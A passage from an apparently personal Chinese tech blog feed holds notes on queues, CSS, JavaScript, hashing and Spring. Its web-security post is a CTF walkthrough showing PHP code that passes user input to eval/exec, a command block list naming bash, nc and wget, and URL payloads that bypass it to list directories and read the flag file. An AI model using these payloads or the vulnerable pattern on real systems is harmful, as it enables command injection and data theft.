栈顶元素</strong>），并将结果入栈；重复上述过程直到表达式最右端，最后运算得出的值即为表达式的结果</p><p>中缀转后缀：方法也和前缀一样，只是是<strong>从左至右扫描</strong></p><h3 id="ex2-增删速度"><a href="#ex2-增删速度" class="headerlink" title="ex2.增删速度"></a>ex2.增删速度</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-number">1</span>：vector 底层数据结构为数组，支持快速随机访问 <br><span class="hljs-number">2</span>：list 底层数据结构为双向链表，支持快速增删<br><span class="hljs-number">3</span>：map、set都是STL关联容器，支持快速增删<br></code></pre></td></tr></table></figure><h2 id="task-Queue"><a href="#task-Queue" class="headerlink" title="task-Queue"></a>task-Queue</h2><h3 id="ex1-链队列"><a href="#ex1-链队列" class="headerlink" title="ex1.链队列"></a>ex1.链队列</h3><p>首先我们都知道队列，队列的头指针和尾指针相等的时候说明队列为空</p><p><strong>用链表表示的队列就简称为链队列</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//初始化队列</span><br><span class="hljs-keyword">void</span> InitQueue(LinkQueue *Q)<br>&#123;<br><span class="hljs-comment">//申请头结点内存空间</span><br>QueueNode *s = (QueueNode *)malloc(sizeof(QueueNode));<br>assert(s != <span class="hljs-literal">NULL</span>);<br><span class="hljs-comment">//初始化时，将头指针和尾指针都指向头结点</span><br>Q-&gt;front = Q-&gt;tail = s;<br><span class="hljs-comment">//将头结点的下一结点赋空</span><br>Q-&gt;tail-&gt;next = <span class="hljs-literal">NULL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>我们发现<strong>初始状态头结点和尾节点都是指向空</strong></p><p>插入第 1 个元素时， rear+1 指向该元素， front+1 也指向该元素，插入第 2 个元素时 rear+1 ， front 不变，删除 1 个元素时 front+1 。即 front=rear 不为空时带链的队列中只有一个元素。</p><h2 id="task-css"><a href="#task-css" class="headerlink" title="task-css"></a>task-css</h2><h3 id="ex1-优先级"><a href="#ex1-优先级" class="headerlink" title="ex1. 优先级"></a>ex1. 优先级</h3><p>有关css的优先级</p><p>可以把样式的应用方式分为几个等级，按照等级来计算权重</p><p>1、!important，加在样式属性值后，权重值为 10000<br>2、内联样式，如：style=””，权重值为1000<br>3、ID选择器，如：#content，权重值为100<br>4、类，伪类和属性选择器，如： content、:hover 权重值为10<br>5、标签选择器和伪元素选择器，如：div、p、:before 权重值为1</p><p>6、通用选择器（*）、子选择器（&gt;）、相邻选择器（+）、同胞选择器（~）、权重值为0</p><p>而去css优先级有这样一个规定：<code>越具体优先级越高</code>（#username &gt; span #username）</p><p><strong>另外子选择器<code>&gt;</code>必须是<code>亲儿子</code></strong></p><h3 id="ex2-弹性布局技巧"><a href="#ex2-弹性布局技巧" class="headerlink" title="ex2. 弹性布局技巧"></a>ex2. 弹性布局技巧</h3><p>一些css3的东西</p><p>1.<code>display: flex;</code>:弹性布局</p><p>​    最常用的做法就是将所有<strong>子盒子</strong>都变成行内块元素</p><p>可以在一行显示</p><p>2.<code>line-height: 120rpx;</code>:行高</p><p>​    就是一行文本框的高度，通过调节修改文字的上下位置</p><p>3.<code>overflow: hidden;</code>:消除子元素浮动或者溢出隐藏</p><p>4.<code>letter-spacing: 40rpx;</code>:用于调节单个字间距</p><p>5.<code>flex-wrap: wrap;</code>:对于flex之后的盒子使用</p><p>​    开启自动换行，因为flex之后不会换行，wrap会根据页面宽度进行换行</p><p>6.<code>justify-content: space-between;</code>:贴边对齐</p><p>​    常用与两个盒子并排，一个需要向左对齐，一个需要向右对齐</p><p>7.<code>box-sizing</code>:调节盒子类型</p><p>​    有两个取值：</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs maxima"><span class="hljs-built_in">box</span>-sizing: <span class="hljs-built_in">content</span>-<span class="hljs-built_in">box</span>; <span class="hljs-comment">/*默认值*/</span><br><span class="hljs-built_in">box</span>-sizing: <span class="hljs-built_in">border</span>-<span class="hljs-built_in">box</span>;<br></code></pre></td></tr></table></figure><p>content-box：我们设置的宽度是多宽盒子就多宽，然后<strong>padding和border会撑大盒子</strong></p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">width</span> = content-width<span class="hljs-comment">;</span><br><span class="hljs-attr">height</span> = content-height<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>border-box:相当于计算了border以内的所有宽度，调节<strong>padding和border不会撑大我们的盒子</strong></p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs maxima"><span class="hljs-built_in">width</span> = <span class="hljs-built_in">content</span>-<span class="hljs-built_in">width</span> + padding-left + padding-right + <span class="hljs-built_in">border</span>-left-<span class="hljs-built_in">width</span> + <span class="hljs-built_in">border</span>-right-<span class="hljs-built_in">width</span>;<br><span class="hljs-built_in">height</span> = <span class="hljs-built_in">content</span>-<span class="hljs-built_in">height</span> + padding-top + padding-bottom + <span class="hljs-built_in">border</span>-top-<span class="hljs-built_in">height</span> + <span class="hljs-built_in">border</span>-bottom-<span class="hljs-built_in">height</span>;<br></code></pre></td></tr></table></figure><p>8.<code>flex-direction: column;</code></p><p>灵活的项目将垂直显示，正如一个列一样。</p><h3 id="ex3-block，inline，inline-block"><a href="#ex3-block，inline，inline-block" class="headerlink" title="ex3. block，inline，inline-block"></a>ex3. block，inline，inline-block</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-number">1</span><span class="hljs-selector-class">.inline</span> ： 使用此属性后，元素会被显示为内联元素，元素则不会换行 <br><br>inline是行内元素，同行可以显示，像<span class="hljs-selector-tag">span</span>、<span class="hljs-attribute">font</span>、<span class="hljs-selector-tag">em</span>、<span class="hljs-selector-tag">b</span>这些默认都是行内元素，不会换行，无法设置宽度、高度、<span class="hljs-attribute">margin</span>、<span class="hljs-attribute">border</span><br><br><span class="hljs-number">2</span><span class="hljs-selector-class">.block</span> ： 使用此属性后，元素会被现实为块级元素，元素会进行换行。 <br><br>block，块元素，<span class="hljs-selector-tag">div</span>、<span class="hljs-selector-tag">p</span>、<span class="hljs-selector-tag">ul</span>、<span class="hljs-selector-tag">li</span>等这些默认都是块元素，会换行，除非设置<span class="hljs-attribute">float</span> <br><br><span class="hljs-number">3</span><span class="hljs-selector-class">.inline-block</span> ： 是使元素以块级元素的形式呈现在行内。意思就是说，让这个元素显示在同一行不换行，但是又可以控制高度和宽度，这相当于内敛元素的增强。(IE6不支持) <br></code></pre></td></tr></table></figure><p>块级元素可以调节margin和padding，也可以使用text-indent（缩进功能），letter-spacing（调整字符间距）</p><p>说道这里还有一个边距的顺序问题</p><p>padding:上、右、下、左边距</p><p>但是只有三个参数时：上 左右 下边距</p><h3 id="ex4-canvas，object，source"><a href="#ex4-canvas，object，source" class="headerlink" title="ex4.canvas，object，source"></a>ex4.canvas，object，source</h3><p> <code>&lt;canvas&gt;</code> 是 <code>HTML5</code> 新增的，一个可以使用脚本(通常为<code>JavaScript</code>)在其中绘制图像的 <code>HTML</code> 元素。它可以用来制作照片集或者制作简单(也不是那么简单)的动画，甚至可以进行实时视频处理和渲染。</p><p>object和source是用来指定媒体资源的</p><p>object：用于指定多种文件格式的资源<code>&lt;object width=&quot;400&quot; height=&quot;400&quot; data=&quot;helloworld.swf&quot; &gt;</code></p><p>source：专门用于指定video，audio，img等媒体资源</p><h3 id="ex5-reflow，repaint"><a href="#ex5-reflow，repaint" class="headerlink" title="ex5. reflow，repaint"></a>ex5. reflow，repaint</h3><p>在浏览器渲染页面的过程中，页面中的代码进行渲染时，已经使浏览器不堪重负了，如果当用户使用时，替换一个背景颜色，或者更换一个样式，那么我们的浏览器又需要重新加载代码，而在这个过程中，浏览器又一次的受到了压力，日复一日说不定哪天就崩掉了</p><pre><code class="hljs">而主要影响页面渲染速度的为：reflow和repaint</code></pre><p>1.reflow(回流)<br>        为什么页面加载会慢，因为浏览器需要花时间、花精力去渲染，尤其是当它发现某个部分发生变化时影响到布局，就需要倒回去重新渲染，这个倒回去渲染的过程就叫做reflow(回流)</p><p>2.repaint(重绘)<br>        如果变化的元素，只是更改了元素的背景色，文字颜色、边框颜色等等不影响它周围或者内部布局的属性，那这种行为只会引起repaint(重绘)，所以repaint的速度明显比reflow快</p><p>所以页面改变要尽量减少触发回流（reflow）</p><p>而最经典的就是：所以display会导致回流，visibility只会导致重绘</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-attribute">visibility</span>:hidden;属性会使对象不可见，但该对象在网页所占的空间没有改变，等于留出了一块空白区域，<br><span class="hljs-attribute">display</span>:none属性会使这个对象彻底消失不显示，也不再占用位置。<br></code></pre></td></tr></table></figure><h3 id="ex6-nth-child"><a href="#ex6-nth-child" class="headerlink" title="ex6. :nth-child"></a>ex6. :nth-child</h3><p>:nth-child(n)  指的是 选择父元素的第n个子元素  n大于0 从1开始</p><p>还有nth-last-child(n)也是选择子元素，只不过是倒着选取，从1开始</p><h2 id="task-js"><a href="#task-js" class="headerlink" title="task-js"></a>task-js</h2><h3 id="ex1-数组的map方法"><a href="#ex1-数组的map方法" class="headerlink" title="ex1.数组的map方法"></a>ex1.数组的map方法</h3><p>js数组中有一个map方法，多用于提取对象数组中特定的值，可以看成一个for循环</p><p>语法: array.map( function ( item, index, arr) {} )</p><p>第一个参数:item,必须,当前元素的值</p><p>第二个参数:index,可选,当前元素在数组中的索引值</p><p>第三个参数:arr,当前元素属于的数组对象</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-comment">//提取details数组中的img_url属性</span><br><span class="hljs-keyword">const</span> urls = <span class="hljs-keyword">this</span>.details.map(item =&gt; &#123;<br><span class="hljs-keyword">return</span> item.img_url<br>&#125;)<br></code></pre></td></tr></table></figure><h3 id="ex2-基础语法糖"><a href="#ex2-基础语法糖" class="headerlink" title="ex2.基础语法糖"></a>ex2.基础语法糖</h3><h4 id="Object-assign的理解："><a href="#Object-assign的理解：" class="headerlink" title="Object.assign的理解："></a>Object.assign的理解：</h4><p>作用：Object.assign可以实现对象的合并。</p><p>语法：Object.assign(target, …sources)</p><p>解析：</p><ol><li>Object.assign会将source里面的可枚举属性复制到target，如果和target的已有属性重名，则会覆盖。</li><li>后续的source会覆盖前面的source的同名属性。</li><li>Object.assign复制的是属性值，如果属性值是一个引用类型，那么复制的其实是引用地址，就会存在引用共享的问题。</li></ol><p>简单来说就是：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> p1 = &#123;&#125;<br><span class="hljs-keyword">let</span> p2 = &#123;<span class="hljs-attr">name</span>:<span class="hljs-string">&#x27;jack&#x27;</span>&#125;<br><span class="hljs-built_in">console</span>.log(<span class="hljs-built_in">Object</span>.assign(p1,p2))<br><span class="hljs-comment">//结果</span><br>p1=&gt;&#123;<span class="hljs-attr">name</span>:<span class="hljs-string">&#x27;jack&#x27;</span>&#125;<br></code></pre></td></tr></table></figure><h4 id="this"><a href="#this" class="headerlink" title="this:"></a>this:</h4><p>this是代表js程序当前指向的一种指针，一般条件下的this指向window，也就是全局</p><p>这段代码中：**<code>this.foo</code>改变的是全局中的foo变量**，所以最后的运行结果是456</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> foo = <span class="hljs-string">&#x27;123&#x27;</span>; <span class="hljs-comment">//全局的foo</span><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">print</span>(<span class="hljs-params"></span>) </span>&#123;<br><br><span class="hljs-keyword">var</span> foo = <span class="hljs-string">&#x27;456&#x27;</span>;<span class="hljs-comment">//print 函数中的foo</span><br><br><span class="hljs-built_in">this</span>.foo = <span class="hljs-string">&#x27;789&#x27;</span>;<br><br><span class="hljs-built_in">console</span>.log(foo);<br><br>&#125;<br><br>print();<br></code></pre></td></tr></table></figure><h4 id="加减："><a href="#加减：" class="headerlink" title="加减："></a>加减：</h4><p>在js中，<code>+</code>有两种含义，第一种是字符串拼接，第二种是算术运算符。而<code>-</code>只有一种含义，就是算术运算符</p><p>在”100”+3-“1”中，<strong>减号作为算术运算转换1位num类型并优先运算</strong>，得到2</p><p><strong>然后加号在有字符串的情况下优先代表字符串拼接</strong>，得到结果”102”</p><h4 id="iframe"><a href="#iframe" class="headerlink" title="iframe:"></a>iframe:</h4><h2 id="task-算法"><a href="#task-算法" class="headerlink" title="task-算法"></a>task-算法</h2><h3 id="ex1-哈希表-链地址法"><a href="#ex1-哈希表-链地址法" class="headerlink" title="ex1.哈希表-链地址法"></a>ex1.哈希表-链地址法</h3><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">设哈希表长为<span class="hljs-number">8</span>，哈希函数为Hash <span class="hljs-comment">(key)</span>=key<span class="hljs-meta">%</span><span class="hljs-number">7</span>。初始记录关键字序列为<span class="hljs-comment">(32，24，15，27，20，13)</span>，用链地址法作为解决冲突方法的平均查找长度是？<br></code></pre></td></tr></table></figure><p>首先根据<code>hash(key)=key%7</code>，那么关键字序列就得到了<code>(4,3,1,6,6,6)</code>，链表法是将重复的key插入在相同的key后面形成一个链表，每一次查找都需要遍历完整个链表。</p><p>所以查找长度：4x1+1x2+1x3</p><p>平均查找长度再除以一个6 得到1.5</p>]]></content>
    
    
    <categories>
      
      <category>算法</category>
      
    </categories>
    
    
    <tags>
      
      <tag>算法</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>web安全</title>
    <link href="/2022/09/19/web%E5%AE%89%E5%85%A8/"/>
    <url>/2022/09/19/web%E5%AE%89%E5%85%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="web安全"><a href="#web安全" class="headerlink" title="web安全"></a>web安全</h1><p>先记录一点基本的题目</p><h2 id="1-基本题目"><a href="#1-基本题目" class="headerlink" title="1.基本题目"></a>1.基本题目</h2><h3 id="1-1-rce"><a href="#1-1-rce" class="headerlink" title="1.1 rce"></a>1.1 rce</h3><p>RCE英文全称：remote command/code execute<br>分为远程命令执行ping和远程代码执行evel。<br>漏洞出现的原因：没有在输入口做输入处理。</p><p>像这样的：就是一个典型的rce问题，使用了eval函数（eval — 把字符串作为PHP代码执行）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>]))<span class="hljs-comment">//isset判断get参数的位置是否有url这个参数</span><br>&#123;<br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>]);<span class="hljs-comment">//如果有就直接执行url中的代码</span><br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>这时我们在参数栏中使用<code>system()</code>执行代码，ls代表展示文件列表</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">/?url=<span class="hljs-keyword">system</span>(<span class="hljs-keyword">ls</span>);<br></code></pre></td></tr></table></figure><p>我们发现显示了<code>index.php</code>这个页面</p><p>然后使用：进入主目录</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">/?url=<span class="hljs-keyword">system</span>(%22ls%20/%22);<br></code></pre></td></tr></table></figure><p>得到一串代码：中间有一段乱码</p><p><code>bin boot dev etc flllllaaaaaaggggggg home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var</code></p><p>使用cat命令：</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">?url=<span class="hljs-keyword">system</span>(%27cat%20/flllllaaaaaaggggggg%27);<br></code></pre></td></tr></table></figure><p>拿到flag</p><h3 id="1-2finalrce"><a href="#1-2finalrce" class="headerlink" title="1.2finalrce"></a>1.2finalrce</h3><p>可以看到过滤了很多东西</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>]))<br>&#123;<br>  <span class="hljs-variable">$url</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br>  <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/bash|nc|wget|ping|ls|cat|more|less|phpinfo|base64|echo|php|python|mv|cp|la|\-|\*|\&quot;|\&gt;|\&lt;|\%|\$/i&#x27;</span>,<span class="hljs-variable">$url</span>))<br>  &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Sorry,you can&#x27;t use this.&quot;</span>;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Can you see anything?&quot;</span>;<br>    exec(<span class="hljs-variable">$url</span>);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里要用到<code> command | tee file.txt</code>这个linux命令</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">?url=l\s<span class="hljs-meta">%</span><span class="hljs-number">20</span>/<span class="hljs-meta">%</span><span class="hljs-number">20</span>|<span class="hljs-meta">%</span><span class="hljs-number">20</span>tee<span class="hljs-meta">%</span><span class="hljs-number">201.</span>txt<br></code></pre></td></tr></table></figure><p>然后进入1.txt看到乱码</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">flllllaaaaaaggggggg</span><br></code></pre></td></tr></table></figure><p>再进行tac和tee（tac命令用于将文件以行为单位的反序输出，即第一行最后显示，最后一行先显示。tac实际上是cat反过来写。）</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">/?tac<span class="hljs-meta">%</span><span class="hljs-number">20</span>/flllllaaaaaaggggggg<span class="hljs-meta">%</span><span class="hljs-number">20</span>|<span class="hljs-meta">%</span><span class="hljs-number">20</span>tee<span class="hljs-meta">%</span><span class="hljs-number">202.</span>txt<br></code></pre></td></tr></table></figure><p>然后进入2.txt拿到flag</p>]]></content>
    
    
    <categories>
      
      <category>safe</category>
      
    </categories>
    
    
    <tags>
      
      <tag>安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Spring</title>
    <link href="/2022/09/13/Spring/"/>
    <url>/2022/09/13/Spring/</url>
    
    <content type="html"><![CDATA[<h1 id="Spring"><a href="#Spring" class="headerlink" title="Spring"></a>Spring</h1><h2 id="1-Spring-Framework"><a href="#1-Spring-Framework" class="headerlink" title="1.Spring Framework"></a>1.Spring Framework</h2><h3 id="1-1-Framework的体系结构"><a href="#1-1-Framework的体系结构" class="headerlink" title="1.1 Framework的体系结构"></a>1.1 Framework的体系结构</h3><p>我们这里介绍的是Spring4.0的体系结构</p><p>从底层的核心容器（管理对象）开始向上搭建</p><p><img src="https://img-blog.csdnimg.cn/ddc99f8b58b44c4ea42f29ddca52cbe1.png" alt="farmework体系结构"></p><h3 id="1-2-核心概念"><a href="#1-2-核心概念" class="headerlink" title="1.2 核心概念"></a>1.2 核心概念</h3><p>IoC：为了解耦而提出的方案（控制反转）</p><p><img src="https://img-blog.csdnimg.cn/758fe91bb7204080a6e09205f149202a.png" alt="ioc"></p><p>不再new产生，而是使用IoC容器中的创建好的对象，将对象统一放入IoC容器中进行管理，并对于有依赖关系的对象提供DI</p><p>原本的<code>priavte BookDao bookDao = new BookImp()</code> 变成了 <code>private BookDao bookDao</code></p><p>而IoC容器中被管理的对象被称为<code>bean</code></p><p>DI：依赖注入</p><p>对bean与bean之间建立依赖关系，叫做依赖注入</p><p>也是为了充分解耦而创建</p><p>达到的效果就是获取IoC容器中的bean时，可以一起提取相关的对应关系</p><h3 id="1-3入门案例"><a href="#1-3入门案例" class="headerlink" title="1.3入门案例"></a>1.3入门案例</h3><p>IoC：</p><p>我们首先导入Spring</p><p>在<code>pom.xml</code>中依赖中写入</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-context<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>5.2.10.RELEASE<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>然后在resource下新建spring的config文件-<code>applicationContext.xml</code></p><p>然后在创建的配置文件下写入bean对应的class</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--2.配置bean--&gt;</span><br><span class="hljs-comment">&lt;!--bean标签标示配置bean</span><br><span class="hljs-comment">id属性标示给bean起名字</span><br><span class="hljs-comment">class属性表示给bean定义类型--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;bookDao&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.itheima.dao.impl.BookDaoImpl&quot;</span>/&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;bookService&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.itheima.service.impl.BookServiceImpl&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><p>然后我们建立一个主方法</p><p>获取IoC容器，容器的类型是一个接口叫做<code>ApplicationContext</code>，我们new它的实现类<code>ClassPathXmlApplicationContext</code>，里面传递的参数是我们resource中配置spring文件的名称<code>applicationContext.xml</code></p><p>调用getBean拿到Bean，然后使用对象中的方法</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-comment">//3.获取IoC容器</span><br>ApplicationContext ctx = <span class="hljs-keyword">new</span> <span class="hljs-constructor">ClassPathXmlApplicationContext(<span class="hljs-string">&quot;applicationContext.xml&quot;</span>)</span>;<br><span class="hljs-comment">//4.获取bean（根据bean配置id获取）</span><br>BookDao bookDao = (BookDao) ctx.get<span class="hljs-constructor">Bean(<span class="hljs-string">&quot;bookDao&quot;</span>)</span>;<br>bookDao.save<span class="hljs-literal">()</span>;<br></code></pre></td></tr></table></figure><p>DI：</p><p>我们在service（另一个class文件）中要获取另一个bean中的对象</p><p>首先删除new替换为set方法</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">//5.删除业务层中使用new的方式创建的dao对象</span><br><span class="hljs-keyword">private</span> BookDao bookDao;<br><br><span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-function"><span class="hljs-title">save</span>(<span class="hljs-params"></span>)</span> &#123;<br>    System.out.println(<span class="hljs-string">&quot;book service save ...&quot;</span>);<br>    bookDao.save();<br>&#125;<br><span class="hljs-comment">//6.提供对应的set方法</span><br><span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-function"><span class="hljs-title">setBookDao</span>(<span class="hljs-params">BookDao bookDao</span>)</span> &#123;<br>    <span class="hljs-built_in">this</span>.bookDao = bookDao;<br>&#125;<br></code></pre></td></tr></table></figure><p>然后在<code>applicationContext.xml</code>文件中，为了实现将dao对象放入service中：</p><p>其中name是被引入的对象在service中的名称，ref是该对象在bean中的id或者name（编程中我们一般统一）</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;bookService&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.itheima.service.impl.BookServiceImpl&quot;</span>&gt;</span><br>    <span class="hljs-comment">&lt;!--7.配置server与dao的关系--&gt;</span><br>    <span class="hljs-comment">&lt;!--property标签表示配置当前bean的属性</span><br><span class="hljs-comment">    name属性表示配置哪一个具体的属性</span><br><span class="hljs-comment">    ref属性表示参照哪一个bean--&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;bookDao&quot;</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">&quot;bookDao&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="1-4-bean"><a href="#1-4-bean" class="headerlink" title="1.4 bean"></a>1.4 bean</h3><h4 id="1-4-1-基础配置"><a href="#1-4-1-基础配置" class="headerlink" title="1.4.1 基础配置"></a>1.4.1 基础配置</h4><p>bean中可以使用name给bean起别名</p><p>别名可以有多个使用 空格，逗号和分号进行分隔</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;bean <span class="hljs-attribute">id</span>=<span class="hljs-string">&quot;bookDao&quot;</span> <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;Dao1,Dao2&quot;</span> <span class="hljs-attribute">class</span>=<span class="hljs-string">&quot;com.itheima.dao.impl.BookDaoImpl&quot;</span>/&gt;<br></code></pre></td></tr></table></figure><p>另外，bean为我们创建的对象默认是单一的，调用多次getBean得到的其实是同一个对象</p><p>如果我们想获得多个对象</p><p>就需要在bean中添加配置 prototype是不同的对象；singleton是默认的，为同一个对象</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;bean <span class="hljs-attribute">id</span>=<span class="hljs-string">&quot;bookDao&quot;</span> <span class="hljs-attribute">class</span>=<span class="hljs-string">&quot;com.itheima.dao.impl.BookDaoImpl&quot;</span> <span class="hljs-attribute">scope</span>=<span 